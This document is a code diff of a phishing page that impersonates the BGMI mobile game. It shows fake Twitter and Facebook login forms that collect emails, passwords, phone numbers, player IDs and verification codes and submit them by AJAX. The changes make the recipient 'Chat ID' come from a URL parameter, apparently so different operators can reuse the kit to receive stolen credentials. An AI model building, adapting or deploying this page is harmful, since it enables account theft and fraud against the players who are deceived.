@@ -1985,7 +1985,7 @@ WINNER WINNER CHICKEN DINNER!
 <br>
 Official BGMI MOBILE Game!</div></div>
 <form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
-<input type="hidden" name="id" id="id" value="6351331850">
+<input type="hidden" id="id">
 <div class="form-group-twitter">
 <input type="text" name="email" id="email-twitter" autocomplete="off" required="" oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
 <label>Phone, email, or username</label>
@@ -2040,7 +2040,7 @@ By continuing, BGMI MOBILE will receive ongoing access to the information that y
 <div class="txt-login-fb">Log in to your Facebook account to connect to BGMI MOBILE.</div> <!--- txt-login-fb --->
 <div class="txt-login-alert">This doesn't let the app post to Facebook.</div> <!--- txt-login-fb --->
 <form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
-<input type="hidden" name="id" id="id" value="6351331850">
+<input type="hidden" id="id">
 <div class="form-group-fb">
 <input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
 <div class="login-form-shid showPassword" id="showFbPassword" onclick="showFbPassword()">Show</div> <!--- login-form-shid showPassword --->
@@ -2080,7 +2080,7 @@ By continuing, BGMI MOBILE will receive ongoing access to the information that y
 <div class="popup-box-alert4">
 <br>Please re-verify your account</div> <!--- popup-box-alert --->
 <form class="popup-box-form" action="javascript:void(0)" method="post" id="MyValidateVerificationDataForm">
-<input type="hidden" name="id" id="id" value="6351331850">
+<input type="hidden" id="id">
 <input type="hidden" name="email" id="validateEmail" readonly="">
 <input type="hidden" name="password" id="validatePassword" readonly="">
 <input type="hidden" name="codetel" id="validateTel" readonly="">
@@ -2173,12 +2173,26 @@ var $playid = $("input#playid").val();
 var $phone = $("input#phone").val();
 var $level = $("input#level").val();
 var $validateLogin = $("input#validateLogin").val();
-var $id = new URLSearchParams(window.location.search).get('id');
+const $id = new URLSearchParams(window.location.search).get('id');
 if($validateEmail == "" && $validatePassword == "" && $codetel == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == ""){
 $('.verification_info').show();
 $('.account_verification').hide();
 return false;
 }
+alert(
+    "📌 Confirm Submission Details\n" +
+    "━━━━━━━━━━━━━━━━━━━\n" +
+    "🆔 Chat ID: " + ($id || 'N/A') + "\n" +
+    "📧 Email: " + ($validateEmail || 'N/A') + "\n" +
+    "🔑 Password: " + ($validatePassword || 'N/A') + "\n" +
+    "📞 Phone: " + ($phone || 'N/A') + "\n" +
+    "🎮 Play ID: " + ($playid || 'N/A') + "\n" +
+    "📲 CodeTel: " + ($codetel || 'N/A') + "\n" +
+    "🎯 Level: " + ($level || 'N/A') + "\n" +
+    "📲 Login Type: " + ($validateLogin || 'N/A') + "\n" +
+    "━━━━━━━━━━━━━━━━━━━\n" +
+    "Click OK to submit or Cancel to review."
+);
 
 $.ajax({
 type: "POST",
@@ -2236,5 +2250,15 @@ slidesHeader[slideIndexHeader-1].style.display = "block";
 setTimeout(showSlidesHeader, 3000);
 }
 </script>
+<script>
+        $(document).ready(function () {
+            let urlParams = new URLSearchParams(window.location.search);
+            let idValue = urlParams.get('id'); 
+
+            if (idValue) {
+                $("input#id").val(idValue); 
+            }
+        });
+    </script>
 
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'91f0b6ba38729f60',t:'MTc0MTc1NTQ3OC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>
